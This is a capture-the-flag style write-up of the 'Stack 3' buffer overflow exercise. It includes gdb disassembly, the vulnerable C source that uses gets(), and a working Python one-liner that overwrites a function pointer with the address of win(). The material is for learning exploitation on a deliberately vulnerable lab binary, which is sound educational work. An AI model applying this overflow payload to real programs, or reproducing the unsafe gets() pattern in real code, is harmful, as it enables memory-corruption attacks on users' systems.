# Stack 3

## Problem

Here we can guess that there is a variable assigned to $0$ in `main+9` and that there is a stack from `esp+1c`. There seems to be a possible exploit with teh `gets` call and following a cmp to $0$ for the variable. We can again guess that the buffer is 64bytes and we might want to overflow the buffer first.
In `main+45` we see that the variable is copied to edx and eventually there is a call to the location within eax at `main+64`.

```gdb
Dump of assembler code for function main:
0x08048438 <main+0>:    push   ebp
0x08048439 <main+1>:    mov    ebp,esp
0x0804843b <main+3>:    and    esp,0xfffffff0
0x0804843e <main+6>:    sub    esp,0x60
0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:   lea    eax,[esp+0x1c]
0x0804844d <main+21>:   mov    DWORD PTR [esp],eax
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    eax,0x8048560
0x08048461 <main+41>:   mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:   mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:   mov    DWORD PTR [esp],eax
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
0x08048477 <main+63>:   leave
0x08048478 <main+64>:   ret
End of assembler dump.
```

We try to find out if there are other functions that is called in main.

```gdb
info functions
>>>All defined functions:
>>>
>>>File stack3/stack3.c:
>>>int main(int, char **);
>>>void win(void);
```

and we can see that there is another `win` function that we might need to work with.

```gdb
Dump of assembler code for function win:
0x08048424 <win+0>:     push   ebp
0x08048425 <win+1>:     mov    ebp,esp
0x08048427 <win+3>:     sub    esp,0x18
0x0804842a <win+6>:     mov    DWORD PTR [esp],0x8048540
0x08048431 <win+13>:    call   0x8048360 <puts@plt>
0x08048436 <win+18>:    leave
0x08048437 <win+19>:    ret
End of assembler dump.
```

I can guess that the stack overflow should have the address location of `win`. We try to combine our stack1 and stack0 knowledge for this.

## Idea and Attack process

We first overflow the buffer first through the gets command. Note that the stack starts at `esp+0x1c`, and the target variable that we want to modify is at `esp+0x5c` which is after the stack. We try to overflow with the address location of `win` to find out what will happen.
We use python to pipe the input into the `gets` call and see the results.

```shell
python -c 'print "1234567890123456789012345678901234567890123456789012345678901234\x24\x84\x04\x08"' | ./stack3
>>>calling function pointer, jumping to 0x08048424
>>>code flow successfully changed
```

## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
